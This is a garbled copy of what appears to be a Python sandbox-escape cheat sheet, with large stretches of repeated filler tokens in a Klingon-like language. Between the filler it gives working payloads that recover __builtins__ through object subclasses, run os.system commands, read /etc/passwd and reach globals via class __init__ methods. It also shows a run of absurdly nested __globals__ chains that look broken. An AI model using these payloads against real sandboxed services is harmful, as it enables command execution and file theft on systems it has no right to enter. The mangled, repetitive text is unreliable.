**'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'
```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```
### Builtins payloads

### Builtins payloads

#### `__import__`

```python
__import__('os').system('ls')
```

#### `__builtins__.__import__`

```python
__builtins__.__import__('os').system('ls')
```

#### `__builtins__.__import__.__dict__`

```python
__builtins__.__import__.__dict__['os'].system('ls')
```

#### `__builtins__.__import__.__dict__['__builtins__']['__import__']`

```python
__builtins__.__import__.__dict__['__builtins__']['__import__']('os').system('ls')
```

#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`

```python
__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
```

#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`

```python
__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
```

#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`

```python
__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
```

#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`

```python
__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
```

#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`

```python
__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
```

#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`

```python
__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
```

#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`

```python
__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
```

#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`

```python
__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
```

#### `__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']`

```python
__builtins__.__import__.__dict__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__'].__globals__['__builtins__']['__import__']('os').system('ls')
```
```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```
## Globals and locals

**`globals`** **`locals`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`** **`'e'`** **`'o'`
```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```
[**QatlhDaq 'ej vItlhutlh**](./#recursive-search-of-builtins-globals) **bIghom** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** 